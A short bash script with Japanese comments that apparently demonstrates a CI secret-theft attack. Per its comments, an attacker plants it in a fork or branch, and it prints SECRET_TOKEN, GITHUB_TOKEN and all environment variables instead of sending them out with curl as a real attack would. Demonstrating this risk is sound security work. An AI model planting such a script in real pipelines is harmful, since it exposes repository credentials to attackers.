#!/bin/bash
# 攻撃者がフォーク(または別ブランチ)に仕込むスクリプト
# 実際の攻撃では curl 等で外部サーバーに送信するが、今回は確認のため echo するだけ

echo "====================================="
echo "  攻撃者のコードが実行されています！"
echo "====================================="
echo ""
echo "[窃取] SECRET_TOKEN = ${SECRET_TOKEN}"
echo "[窃取] GITHUB_TOKEN = ${GITHUB_TOKEN}"
echo ""
echo "[環境変数一覧]"
env | sort
